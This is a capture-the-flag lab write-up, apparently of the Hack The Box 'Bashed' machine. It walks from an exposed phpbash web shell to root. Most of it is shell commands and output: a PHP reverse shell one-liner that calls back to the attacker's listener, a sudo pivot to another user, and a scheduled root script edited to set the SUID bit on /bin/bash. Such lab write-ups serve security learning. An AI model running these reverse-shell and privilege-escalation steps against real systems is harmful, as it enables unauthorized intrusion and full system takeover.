## Apache
Apache is serving a fairly simplistic website:

## Reading
Performed some standard googling and came across the [GitHub](https://github.com/Arrexel/phpbash) site for PHP bash.

An image on the website itself leads me to believe we need to do some additional enumeration on the /uploads folder. I can't seem to navigate directly to the path shown in the screenshot, however, I suspect it may still be a good lead.

# Exploitation
---
Began navigating through all of the '301s' manually and eventually found the phpbash.php file underneath the /dev directory:
![[Pasted image 20220627103220.png]]
and now we have a low-level shell within the browser:
![[Pasted image 20220627103251.png]]


# Privilege Escalation
---
Did a quick 'find' for the user.txt flag - cat'd out and submitted. Checked sudo -l out of habit and found that user scriptmanager can run any command with no password:
```bash
www-data@bashed
:/var/www/html# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed
:/var/www/html# find /* -name user.txt

find: '/etc/ssl/private': Permission denied
/home/arrexel/user.txt
```

## Reverse Shell 
In order to get a reverse shell, I looked up PHP Reverse Shell cheatsheets and found the following [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php) . Pulled out the syntax, modified, started a listener on my machine, and moved over to the terminal window.
```bash
php -r '$sock=fsockopen("10.10.14.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Shell Stabilization
Needed a better shell. Ran /bin/bash as user scriptmanager, confirmed that python 2 is installed, pulled up the appropriate syntax for python pty:
```bash
─[us-vip-4]─[10.10.14.2]─[htb-ghohst@pwnbox-base]─[~/Downloads/phpbash]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.68] 48594
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ sudo -u scriptmanager /bin/bash
whoami
scriptmanager
python --version
Python 2.7.12
python -c 'import pty;pty.spawn("/bin/bash")'
scriptmanager@bashed:/$ 
```

## Scripts Folder
Started by checking out the file structure and found the 'scripts' folder almost immediately. Looks like a file within can be manipulated by this 'scriptmanager' user:
```bash
scriptmanager@bashed:/$ ls
ls
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
scriptmanager@bashed:/$ ls -al /scripts
ls -al /scripts
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jun 27 10:04 test.txt
scriptmanager@bashed:/$ 
```

Cat'd out the contents of these two files. Noted that the last modified date was changing every minute, indicating this .py gets run on a schedule (Every minute)
```bash
testing 123!scriptmanager@bashed:/scripts$ ls -al
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jun 27 10:08 test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ ls -al  
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2 07:19 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..

-rw-r--r--  1 root          root            12 Jun 27 10:09 test.txt
```

I was pulling my hair out because nano was typing out gibberish as I was trying to edit the .py file. After some research I tried to turn off the stty 'echo' via the guidance in this [Link](https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x). 
Hit CTRL+Z to suspend the reverse shell, input the following, then fg'd the reverse shell back into the foreground. Did some testing in Nano and it seemed to be behaving much better.
```
stty raw -echo
```

We know that the test.py script is run on a routine. We can use this to our advantage and have it run code for us. Nano'd test.py and added in the following script:
```bash
import os;
os.system("chmod +s /bin/bash")
```

For additional info about Setuid [Link](https://www.liquidweb.com/kb/how-do-i-set-up-setuid-setgid-and-sticky-bits-on-linux/) 
This will set the SUID bit of /bin/bash and should allow us to run it as root (from any user account). Checked the status of /bin/bash over the course of the next few minutes, was able to successfully call /bin/bash as root:
```bash
scriptmanager@bashed:/$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# 
```

Ran a search for root.txt, cat'd it out and submitted:
```bash
bash-4.3# find /* -name 'root.txt'
/root/root.txt
bash-4.3# cat /root/root.txt
aaxxxxxxxxxxxxxxxxxxxxxxx
bash-4.3# 
```
